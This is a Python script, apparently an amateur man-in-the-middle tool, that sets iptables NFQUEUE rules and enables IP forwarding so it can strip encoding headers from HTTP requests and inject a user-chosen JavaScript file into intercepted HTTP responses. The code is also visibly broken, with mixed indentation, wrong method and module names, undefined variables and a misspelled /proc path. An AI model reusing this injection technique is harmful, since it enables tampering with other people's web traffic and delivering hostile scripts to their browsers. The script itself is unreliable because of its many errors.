#! usr/bin/env python

import os
import re
import sys
import argparse
import subprocess
import netfilterqueue
import scapy.all as scapy

# backup functions to get required input from user
def get_machine(self):
    return bool(input("Do you want to run this program on local machine(true/false): "))
    
def get_path(self):
    return str(input("Enter the path of the inject code file: "))

# whether the script is running aganist local device or remote devices
# Path of the script that you want to inject
# queue-num of the iptables command

def get_arguments():
	p = argparse.ArgumentParser(description='File Interceptor program in python')
	p.add_arguments('-l','--local', dest='local', help='Whether you want to run this on your local machine or not')
    p.add_arguments('-p', '--path', dest='path', help='enter the path of the file you want to inject your code')
    p.add_arguments('-qn','--queue-num', dest='queue_num', help='Queue number in IP tables that you want to capture the packtes into', default=0)
    options = p.parse_args()
	if not options.local:
		options.local = get_machine()
    if not options.path:
        options.path = get_path()
	return options

arguments = get_arguments()

def set_load(packet, load):
    packet[scapy.Raw].load = load # set the load data of the packet 
    # delete the parameter that may change due to modification of load field of packet, scapy automatically calculates and adds these values to the packet
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    sp = scapy.IP(packet.get_payload()) # convert the packet into scapy packet to modify it
    if sp.haslayer(scapy.Raw): # check for the Raw layer in the scapy packet
        packet_load = sp[scapy.Raw].load # non modified load of the captured packet
        if sp.haslayer(scapy.TCP): # check for the TCP layer in the packet
            if sp[scapy.TCP].dport == 80: # check whether the packet is request packet or not
                print("[+] HTTP Request") # if request packet, then print as request packet
                # since the packets information is encoded we replace the encoding part of the request with "", so that server send the information in packets as plain text
                packet_load = re.sub("Accept-Encoding:.*?\\r\\n", "", packet_load)
            elif sp[scapy.TCP].sport == 80: #check whether the packet is reponse packet or not
                print("[+] HTTP Response")
                try:
                    code = open(arguments.path, 'r')
                    injected_code = '''<script>{}</script>'''.format(code) # the code that is to be injected
                    packet_load = packet_load.replace("</body>", "{}</body>".format(injected_code)) #replace the information in load layer in packet
                    content_length_parameter = re.search("(?:Content-Length:\s)(\d*)", load) # finding the coontent length sent by server
                    if content_length_parameter and "text/html" in load: # check for content length header in the packet and content type of the packet
                        length = content_length_parameter.group(1) # grab the length mentioned in the packet
                        new_length = int(length) + int(len(injected_code)) # add the length of your injection code to the content length
                        load = load.replace(length, str(new_length)) # modify the load with the new content length
                except FileNotFoundError as error: # handle the error
                    print("\r[-] File path mentioned in the arguments is not found, please enter correct file path")
                    sys.exit()

            # check if these values are same or not, if not then one of the above if else conditons are executed and have to set payload to captured packet
            if sp[scapy.Raw].load != packet_load: 
                modified_packet = set_load(sp, packet_load) # get the modified packet from the set_load function that just modifies the packet information
                sp.set_payload(str(modified_packet)) # set new payload to the captured packet

    packet.accept() # allow the packets to flow from the system


try:
    if sys.platform in ['win32', 'cygwin']:
        print("[-] Y THE HELL YOU ARE USING WINDOWS FOR HACKS [-]")
        print("[-] QUITTING THE PROGRAM")
        sys.exit()
    elif sys.platform == 'linux':
        os.system('echo 1 > /proc/sys/iv4/ip_forward')
    subprocess.call(['iptables','--flush'])
	Subprocess.call(['iptables','--table', 'nat', '--flush'])
	subprocess.call(['iptables','--delete-chain'])
	subprocess.call(['iptables','--table','nat','--delete-chain'])
    if arguments.local:
		subprocess.call(['iptables','-I','INPUT','-j','NFQUEUE', '--queue-num', arguments.queue_num])
		subprocess.call(['iptables','-I','OUTPUT','-j','NFQUEUE', '--queue-num', arguments.queue_num])
	else:
		subprocess.call(['iptables','-P','FORWARD','ACCEPT'])
		subprocess.call(['iptables','-I','FORWARD','-j','NFQUEUE', '--queue-num', arguments.queue_num])

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(arguments.queue_num, process_packet)
    print("\t\t\t[=] Made with code by DUMMY-the-BOT -- (use carefully)... <PEACE> [=]\n")
	print("[+] Starting file interceptor program")
    queue.run()
except KeyboardInterrupt as error:
    print("\n\r[-] Detected Keyboard Interruption... quitting the program")
	print("[-] Deleting all the iptables created")
	os.system('iptables --flush')
	os.system('iptables --table nat -flush')
	os.system('iptables --delete-chain')
	os.system('iptables --table nat --delete-chain')
	print('[-] End of program usage')
    sys.exit()
except Exception as error:
    print("[-] Exception occurred... \n")
    print(error)
    print("\n[-] QUitting the program...")
    sys.exit()